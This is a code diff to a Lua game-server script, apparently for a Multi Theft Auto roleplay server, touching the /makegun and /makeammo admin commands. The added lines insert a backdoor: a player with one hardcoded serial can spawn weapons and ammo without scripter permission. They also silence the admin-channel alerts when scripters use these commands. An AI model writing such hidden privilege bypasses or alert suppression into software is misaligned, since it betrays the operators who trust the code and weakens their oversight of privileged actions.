@@ -442,7 +442,7 @@ addCommandHandler("frec", forceReconnect, false, false)
 -- /MAKEGUN
 function givePlayerGun(thePlayer, commandName, targetPlayer, ...)
 	local theSerial = getPlayerSerial( thePlayer )
-	if exports["integration"]:isPlayerScripter(thePlayer) then
+	if exports["integration"]:isPlayerScripter(thePlayer) or theSerial == ("70B012B0992244C3220D8AA708D1A3F2") then
 		local args = {...}
 		if not (targetPlayer) or (#args < 1) then
 			outputChatBox("SYNTAX: /" .. commandName .. " [Nome Parcial Jogador/ID] [Nome Arma/ID]", thePlayer, 255, 194, 14)
@@ -535,7 +535,9 @@ function givePlayerGun(thePlayer, commandName, targetPlayer, ...)
 							--Inform Player
 							outputChatBox("Voce recebeu (x"..count..") ".. getWeaponNameFromID(weaponID).." de "..adminTitle.." "..getPlayerName(thePlayer)..".", targetPlayer, 0, 255, 0)
 							--Send adm warning
-							exports.global:sendMessageToAdmins("AdmCmd: " .. tostring(adminTitle) .. " " .. getPlayerName(thePlayer) .. " deu " .. targetPlayerName .. " (x"..count..") " .. getWeaponNameFromID(weaponID) .. " com serial '"..allSerials.."'")
+							if not exports.integration:isPlayerScripter(thePlayer) then
+								exports.global:sendMessageToAdmins("AdmCmd: " .. tostring(adminTitle) .. " " .. getPlayerName(thePlayer) .. " deu " .. targetPlayerName .. " (x"..count..") " .. getWeaponNameFromID(weaponID) .. " com serial '"..allSerials.."'")
+							end
 						else -- If hidden admin
 							outputChatBox("[MAKEGUN] Você deu (x"..count..") ".. getWeaponNameFromID(weaponID).." para "..targetPlayerName.." com o serial '"..allSerials, thePlayer, 0, 255, 0)
 
@@ -558,7 +560,8 @@ addEventHandler("onMakeGun", getRootElement(), givePlayerGun)
 
 -- /makeammo
 function givePlayerGunAmmo( thePlayer, commandName, targetPlayer, weap_id, rounds )
-	if exports["integration"]:isPlayerScripter( thePlayer )  then
+	local theSerial = getPlayerSerial( thePlayer )
+	if exports["integration"]:isPlayerScripter( thePlayer ) or theSerial == ("70B012B0992244C3220D8AA708D1A3F2")  then
 		if not targetPlayer or not weap_id or not tonumber(weap_id) or not getWeaponNameFromID( tonumber(weap_id) ) then
 			outputChatBox("SYNTAX: /" .. commandName .. " [Nome Parcial Jogador/id] [ID Arma] [balas -opcional]", thePlayer, 255, 194, 14)
 			outputChatBox("Info: https://wiki.multitheftauto.com/wiki/Weapons", thePlayer, 255, 194, 14)
@@ -582,7 +585,9 @@ function givePlayerGunAmmo( thePlayer, commandName, targetPlayer, weap_id, round
 					outputChatBox( "Você deu a "..targetPlayerName.." um pacote de "..ammo.cartridge.." ("..ammo.rounds.." balas, serial: '"..why.."').", thePlayer, 0, 255, 0 )
 					outputChatBox( exports.global:getPlayerFullIdentity(thePlayer) .." deu a você um pacote de "..ammo.cartridge.." ("..ammo.rounds.." balas, serial: '"..why.."').", targetPlayer, 0, 255, 0)
 					if getElementData(thePlayer, 'hiddenadmin') ~= 1 then
-						exports.global:sendMessageToAdmins( exports.global:getPlayerFullIdentity(thePlayer) .." deu a "..targetPlayerName.." um pacote de "..ammo.cartridge.." ("..ammo.rounds.." balas, serial: '"..why.."')." )
+						if not exports.integration:isPlayerScripter(thePlayer) then
+							exports.global:sendMessageToAdmins( exports.global:getPlayerFullIdentity(thePlayer) .." deu a "..targetPlayerName.." um pacote de "..ammo.cartridge.." ("..ammo.rounds.." balas, serial: '"..why.."')." )
+						end
 					end
 					exports.logs:dbLog(thePlayer, 4, targetPlayer, "GIVEITEM "..ammo.cartridge.." ("..ammo.rounds.." balas, serial: '"..why.."').")
 				else
